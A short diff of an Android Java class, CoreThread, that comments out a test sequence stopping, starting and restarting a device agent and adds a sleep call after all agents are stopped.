@@ -77,14 +77,15 @@ public class CoreThread extends Activity implements Runnable {
 			// Start agents
 			agentManager.startAgents();
 			Utils.sleep(2000);
-			agentManager.stopAgent(Agent.AGENT_DEVICE);
+/*			agentManager.stopAgent(Agent.AGENT_DEVICE);
 			Utils.sleep(2000);
 			agentManager.startAgent(Agent.AGENT_DEVICE);
 			Utils.sleep(2000);
 			agentManager.restartAgent(Agent.AGENT_DEVICE);
-			Utils.sleep(2000);
+			Utils.sleep(2000);*/
 			// Stop agents
 			agentManager.stopAgents();
+			Utils.sleep(2000);
 			
 			Status status = Status.self();
 			status.triggerAction(0);
